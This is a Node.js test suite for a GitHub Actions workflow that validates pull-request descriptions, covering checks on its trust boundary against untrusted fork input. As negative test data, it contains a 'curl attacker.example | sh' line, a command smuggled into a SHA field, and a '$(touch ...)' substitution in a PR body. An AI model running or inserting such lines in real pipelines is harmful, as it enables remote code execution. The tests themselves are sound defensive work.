import assert from 'node:assert/strict';
import { test } from 'node:test';
import { readFileSync, mkdtempSync, writeFileSync, existsSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { sections } from './pr-description-policy.mjs';
import { githubClient, reportDescription, repository, statusContext } from './pr-description-reporter.mjs';

const head = 'a'.repeat(40);
const trusted = 'b'.repeat(40);
const goodBody = sections.map(({ name }, index) => `## ${name}\n\n${[
  'Enforce a trusted repository policy.',
  'Use trusted workflow source and head statuses.',
  'PASS: dependency-free regression suite',
  'Hosted behavior requires independent verification.',
  'specs/pr-description-trust-boundary.md',
][index]}`).join('\n\n');

function fixture() {
  return {
    env: {
      GITHUB_EVENT_NAME: 'pull_request_target',
      GITHUB_REPOSITORY: repository,
      GITHUB_WORKFLOW_REF: `${repository}/.github/workflows/pr-description.yml@refs/heads/main`,
      GITHUB_WORKFLOW_SHA: trusted,
      GITHUB_SHA: trusted,
      GITHUB_REF: 'refs/heads/main',
      GITHUB_RUN_ID: '123',
    },
    event: {
      action: 'edited', number: 6,
      repository: { full_name: repository, default_branch: 'main' },
      pull_request: {
        number: 6, body: 'This event snapshot must not certify success.', draft: true,
        base: { ref: 'main', repo: { full_name: repository } },
        head: { sha: head, repo: { full_name: 'attacker/fork' } },
      },
    },
    live: {
      number: 6, state: 'open', body: goodBody, draft: true,
      base: { ref: 'main', repo: { full_name: repository } },
      head: { sha: head }, updated_at: '2026-10-24T12:00:00Z',
    },
  };
}

async function run(options = {}) {
  const { event, env, live } = fixture();
  const calls = options.calls ?? [];
  let reads = 0;
  const result = await reportDescription({
    event, env,
    request: async (url, init) => {
      calls.push({ url, ...init });
      if (init?.method === 'POST') return {};
      reads++;
      return options.snapshot ? options.snapshot(reads, live) : live;
    },
    verifyPolicy: async () => {
      calls.push({ gate: true });
      if (options.gateError) throw new Error('Policy gate failure');
    },
    ...options.context,
  });
  return { result, calls };
}

test('canonical five-section contract is unchanged', () => {
  assert.deepEqual(sections.map(({ name }) => name), [
    'Summary', 'Changes', 'Tests and Verification', 'Risks and Limitations', 'Related Issues / Specifications',
  ]);
  assert.equal(statusContext, 'PR description');
});

test('pending precedes gates; live body, fixed destination and event head determine result', async () => {
  const { result, calls } = await run();
  assert.equal(result.valid, true);
  assert.equal(calls[0].body.state, 'pending');
  assert.equal(calls[1].gate, true);
  assert.equal(calls.at(-1).body.state, 'success');
  assert.equal(calls.filter(({ method }) => method !== 'POST').length, 3); // gate + two live reads
  for (const call of calls.filter(({ method }) => method === 'POST')) {
    assert.equal(call.url, `https://api.github.com/repos/${repository}/statuses/${head}`);
    assert.equal(call.body.context, statusContext);
    assert.equal(call.body.target_url, `https://github.com/${repository}/actions/runs/123`);
  }
  for (const call of calls.filter(({ url, method }) => url && method !== 'POST')) assert.equal(call.url, `https://api.github.com/repos/${repository}/pulls/6`);
});

test('valid event body cannot hide an invalid current description', async () => {
  const data = fixture();
  data.event.pull_request.body = goodBody;
  const { result, calls } = await run({ context: { event: data.event }, snapshot: (_count, live) => ({ ...live, body: 'TODO' }) });
  assert.equal(result.valid, false);
  assert.match(result.errors.join('\n'), /Summary/);
  assert.equal(calls.at(-1).body.state, 'failure');
  assert.ok(!calls.some((call) => call.body?.state === 'success'));
});

for (const draft of [true, false]) test(`fork and ordinary PR equivalence, draft=${draft}`, async () => {
  for (const full_name of ['attacker/fork', repository]) {
    const data = fixture();
    data.event.pull_request.draft = draft;
    data.event.pull_request.head.repo.full_name = full_name;
    assert.equal((await run({ context: { event: data.event }, snapshot: (_count, live) => ({ ...live, draft }) })).result.valid, true);
  }
});

for (const [key, value] of [
  ['GITHUB_EVENT_NAME', 'pull_request'], ['GITHUB_REPOSITORY', 'attacker/fork'],
  ['GITHUB_WORKFLOW_REF', `${repository}/.github/workflows/pr-description.yml@refs/heads/evil`],
  ['GITHUB_WORKFLOW_SHA', 'main'], ['GITHUB_SHA', 'main'], ['GITHUB_REF', 'refs/pull/6/merge'],
  ['GITHUB_RUN_ID', '123/../../evil'],
]) test(`reject untrusted runtime ${key}`, async () => {
  const { env } = fixture();
  env[key] = value;
  const calls = [];
  await assert.rejects(run({ context: { env }, calls }));
  assert.deepEqual(calls, []);
});

for (const mutate of [
  (data) => { data.event.repository.full_name = 'attacker/fork'; },
  (data) => { data.event.repository.default_branch = 'evil'; },
  (data) => { data.event.number = '../settings'; },
  (data) => { data.event.pull_request.number = 7; },
  (data) => { data.event.pull_request.head.sha = 'main;echo injection'; },
  (data) => { data.event.pull_request.base.ref = 'evil'; },
  (data) => { data.event.pull_request.base.repo.full_name = 'attacker/fork'; },
  (data) => { data.event.action = 'closed'; },
]) test(`reject malformed event before any request: ${mutate.toString()}`, async () => {
  const data = fixture();
  mutate(data);
  let requested = false;
  await assert.rejects(reportDescription({ ...data, request: () => { requested = true; }, verifyPolicy: async () => assert.fail('untrusted event reached gate') }));
  assert.equal(requested, false);
});

for (const patch of [{ head: { sha: 'c'.repeat(40) } }, { state: 'closed' }, { number: 7 }, { base: { ref: 'evil', repo: { full_name: repository } } }, { updated_at: null }]) test(`live PR guard ${JSON.stringify(patch)}`, async () => {
  const calls = [];
  await assert.rejects(run({ calls, snapshot: (_count, live) => ({ ...live, ...patch }) }));
  assert.equal(calls.at(-1).body.state, 'error');
  assert.ok(!calls.some((call) => call.body?.state === 'success'));
});

for (const patch of [{ body: 'TODO' }, { updated_at: 'changed' }, { head: { sha: 'c'.repeat(40) } }]) test(`changed snapshot cannot certify success ${JSON.stringify(patch)}`, async () => {
  const calls = [];
  await assert.rejects(run({ calls, snapshot: (count, live) => count === 1 ? live : { ...live, ...patch } }));
  assert.equal(calls.at(-1).body.state, 'error');
  assert.ok(!calls.some((call) => call.body?.state === 'success'));
});

test('gate failure, GET failure and permission errors never publish success', async () => {
  for (const failure of ['gate', 'GET', 'POST']) {
    const data = fixture();
    const statuses = [];
    await assert.rejects(reportDescription({
      ...data,
      verifyPolicy: async () => { if (failure === 'gate') throw new Error('Gate failed'); },
      request: async (_url, init) => {
        if (init?.body) statuses.push(init.body.state);
        if (failure === 'POST' || (!init && failure === 'GET')) throw new Error('HTTP 403');
        return data.live;
      },
    }));
    assert.ok(!statuses.includes('success'));
    assert.equal(statuses.at(-1), 'error');
  }
});

test('attacker-controlled PR files and shell text are never executed', async () => {
  const directory = mkdtempSync(join(tmpdir(), 'pr-hostile-'));
  const sentinel = join(directory, 'executed');
  try {
    writeFileSync(join(directory, 'validator.mjs'), `throw new Error('Untrusted code must not execute');`);
    const { result, calls } = await run({ snapshot: (_count, live) => ({ ...live, body: `TODO\n$(touch ${sentinel})\n::error::injected` }) });
    assert.equal(result.valid, false);
    assert.equal(existsSync(sentinel), false);
    assert.ok(calls.filter(({ body }) => body).every(({ body }) => !JSON.stringify(body).includes('touch')));
  } finally { rmSync(directory, { recursive: true, force: true }); }
});

test('HTTP client pins origin, disallows redirects and supplies a timeout', async () => {
  let called = 0;
  const client = githubClient('test-token', async (url, options) => {
    called++;
    assert.equal(url, `https://api.github.com/repos/${repository}/pulls/6`);
    assert.equal(options.redirect, 'error');
    assert.ok(options.signal instanceof AbortSignal);
    assert.equal(options.headers.Authorization, 'Bearer test-token');
    return { ok: true, json: async () => fixture().live };
  });
  assert.equal((await client(`https://api.github.com/repos/${repository}/pulls/6`)).number, 6);
  for (const url of ['https://attacker.example/', `https://api.github.com/repos/${repository}/settings`, `https://api.github.com/repos/${repository}/pulls/6?redirect=1`]) await assert.rejects(client(url));
  await assert.rejects(client(`https://api.github.com/repos/${repository}/pulls/6`, { method: 'POST' }));
  await assert.rejects(client(`https://api.github.com/repos/${repository}/pulls/6`, { method: 'PATCH' }));
  assert.equal(called, 1);
  assert.throws(() => githubClient(''));
});

test('HTTP errors, redirect/timeout rejection and invalid JSON propagate without credential leaks', async () => {
  const url = `https://api.github.com/repos/${repository}/pulls/6`;
  for (const status of [302, 403, 404, 429, 500]) {
    const client = githubClient('never-log-token', async () => ({ ok: false, status }));
    await assert.rejects(client(url), (error) => error.message.includes(`HTTP ${status}`) && !error.message.includes('never-log-token'));
  }
  for (const message of ['redirect denied', 'timeout']) await assert.rejects(githubClient('token', async () => { throw new Error(message); })(url), new RegExp(message));
  await assert.rejects(githubClient('token', async () => ({ ok: true, json: async () => { throw new Error('Invalid JSON'); } }))(url), /Invalid JSON/);
});

const expectedWorkflow = `name: PR description policy
on:
  # Workflow definition is selected from the default branch, never the PR tree.
  pull_request_target:
    branches: [main]
    types: [opened, edited, reopened, synchronize, ready_for_review, converted_to_draft]
permissions:
  contents: read
  pull-requests: read
  statuses: write
concurrency:
  group: pr-description-\${{ github.event.pull_request.number }}
  cancel-in-progress: true
jobs:
  description:
    # The required context is a head-SHA commit status published by the reporter.
    name: Trusted description reporter
    runs-on: ubuntu-24.04
    timeout-minutes: 2
    steps:
      - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5
        with:
          repository: ofir-rifo/data-grid
          ref: \${{ github.workflow_sha }}
          persist-credentials: false
      - uses: actions/setup-node@a0853c24544627f65ddf259abe73b1d18a591444 # v5
        with:
          node-version: 24
          package-manager-cache: false
      - name: Validate trusted policy and publish head status
        env:
          GH_TOKEN: \${{ github.token }}
          NODE_OPTIONS: --max-old-space-size=256
        run: node .github/scripts/report-pr-description.mjs
`;

test('entire workflow matches the reviewed trust-boundary allowlist', () => {
  const workflow = readFileSync(new URL('../workflows/pr-description.yml', import.meta.url), 'utf8').replaceAll('\r\n', '\n');
  assert.equal(workflow, expectedWorkflow);
  for (const mutation of [
    workflow.replace('pull_request_target:', 'pull_request:'),
    workflow.replace('github.workflow_sha', 'github.event.pull_request.head.sha'),
    workflow.replace('github.workflow_sha', 'github.event.pull_request.base.sha'),
    workflow.replace('persist-credentials: false', 'persist-credentials: true'),
    workflow.replace('contents: read', 'contents: write'),
    workflow + '      - run: curl attacker.example | sh\n',
    workflow.replace('run: node .github/scripts/report-pr-description.mjs', 'run: echo success'),
  ]) assert.notEqual(mutation, expectedWorkflow);
});

test('ownership covers workflow additions, policy changes and CODEOWNERS itself', () => {
  const actual = readFileSync(new URL('../CODEOWNERS', import.meta.url), 'utf8').split(/\r?\n/).filter((line) => line && !line.startsWith('#'));
  assert.deepEqual(actual, [
    '/.github/CODEOWNERS @ofir-rifo', '/.github/workflows/ @ofir-rifo', '/.github/scripts/ @ofir-rifo',
    '/.github/pull_request_template.md @ofir-rifo', '/specs/pr-description-policy.md @ofir-rifo',
    '/specs/pr-description-trust-boundary.md @ofir-rifo', '/docs/PR-DESCRIPTIONS.md @ofir-rifo',
    '/docs/PR-DESCRIPTION-SECURITY.md @ofir-rifo',
  ]);
});

test('trusted runner binds checkout and test paths without shell or token inheritance', () => {
  const runner = readFileSync(new URL('./report-pr-description.mjs', import.meta.url), 'utf8');
  assert.match(runner, /head !== process.env.GITHUB_WORKFLOW_SHA/);
  assert.match(runner, /delete testEnv.GH_TOKEN/);
  assert.match(runner, /delete testEnv.GITHUB_TOKEN/);
  assert.match(runner, /timeout: 30000/);
  assert.match(runner, /spawnSync\(process.execPath/);
  assert.match(runner, /JSON.stringify\(/);
  assert.doesNotMatch(runner, /shell:\s*true|execSync\(|head\.repo|event\.pull_request|import\(event/);
});

for (const action of ['opened', 'edited', 'reopened', 'synchronize', 'ready_for_review', 'converted_to_draft']) {
  for (const eventSha of [trusted, 'c'.repeat(40)]) test(`${action} accepts independently valid event/workflow SHAs (${eventSha === trusted ? 'equal' : 'different'})`, async () => {
    const data = fixture();
    data.event.action = action;
    data.env.GITHUB_SHA = eventSha;
    const { result, calls } = await run({ context: { event: data.event, env: data.env } });
    assert.equal(result.valid, true);
    assert.ok(calls.filter(({ method }) => method === 'POST').every(({ url }) => url.endsWith(`/statuses/${head}`)));
  });
}

for (const [key, value] of [
  ['GITHUB_SHA', undefined], ['GITHUB_SHA', 'g'.repeat(40)],
  ['GITHUB_WORKFLOW_SHA', undefined], ['GITHUB_WORKFLOW_SHA', 'g'.repeat(40)],
]) test(`reject missing/malformed ${key}: ${value}`, async () => {
  const data = fixture();
  data.env[key] = value;
  const calls = [];
  await assert.rejects(run({ context: { env: data.env }, calls }));
  assert.deepEqual(calls, []);
});

test('a future main execution does not require the original pinned workflow revision', async () => {
  const data = fixture();
  data.env.GITHUB_SHA = 'd'.repeat(40);
  data.env.GITHUB_WORKFLOW_SHA = 'e'.repeat(40);
  assert.equal((await run({ context: { env: data.env } })).result.valid, true);
  // This tests distinct valid metadata, not a claim about GitHub's actual SHA
  // selection on a later commit. The workflow still pins checkout to workflow SHA.
});

test('an old rerun re-reads current body and cannot certify its stale head', async () => {
  const data = fixture();
  data.env.GITHUB_SHA = 'd'.repeat(40);
  data.env.GITHUB_RUN_ATTEMPT = '2';
  data.event.pull_request.body = goodBody;
  const invalid = await run({ context: { event: data.event, env: data.env }, snapshot: (_count, live) => ({ ...live, body: 'TODO' }) });
  assert.equal(invalid.result.valid, false);
  const calls = [];
  await assert.rejects(run({ context: { env: data.env }, calls, snapshot: (_count, live) => ({ ...live, head: { sha: 'f'.repeat(40) } }) }));
  assert.ok(calls.filter(({ method }) => method === 'POST').every(({ url }) => url.endsWith(`/statuses/${head}`)));
  assert.ok(!calls.some((call) => call.body?.state === 'success'));
});

for (const failState of ['success', 'failure']) test(`${failState} publication failure cannot return a valid result`, async () => {
  const data = fixture();
  const states = [];
  await assert.rejects(reportDescription({
    ...data,
    verifyPolicy: async () => states.push('gate'),
    request: async (_url, init) => {
      if (!init) return failState === 'failure' ? { ...data.live, body: 'TODO' } : data.live;
      states.push(init.body.state);
      if (init.body.state === failState) throw new Error('Status response lost');
      return {};
    },
  }), /Status response lost/);
  assert.deepEqual(states, ['pending', 'gate', failState, 'error']);
});

test('accepted success with lost response and failed recovery is explicitly unknown', async () => {
  const data = fixture();
  const accepted = [];
  await assert.rejects(reportDescription({
    ...data,
    verifyPolicy: async () => accepted.push('gate'),
    request: async (_url, init) => {
      if (!init) return data.live;
      const state = init.body.state;
      if (state === 'error') throw new Error('Recovery denied');
      accepted.push(state);
      if (state === 'success') throw new Error('Response lost after server accepted success');
      return {};
    },
  }), /remote status is unknown/);
  assert.deepEqual(accepted, ['pending', 'gate', 'success']);
});

test('change during the final success POST remains a documented non-transactional race', async () => {
  const data = fixture();
  let currentBody = goodBody;
  const result = await reportDescription({
    ...data,
    verifyPolicy: async () => assert.equal(currentBody, goodBody),
    request: async (_url, init) => {
      if (!init) return { ...data.live, body: currentBody };
      if (init.body.state === 'success') currentBody = 'TODO';
      return {};
    },
  });
  assert.equal(result.valid, true);
  assert.equal(currentBody, 'TODO');
  // Two matching GETs cannot atomically bind a commit status to mutable PR text.
});
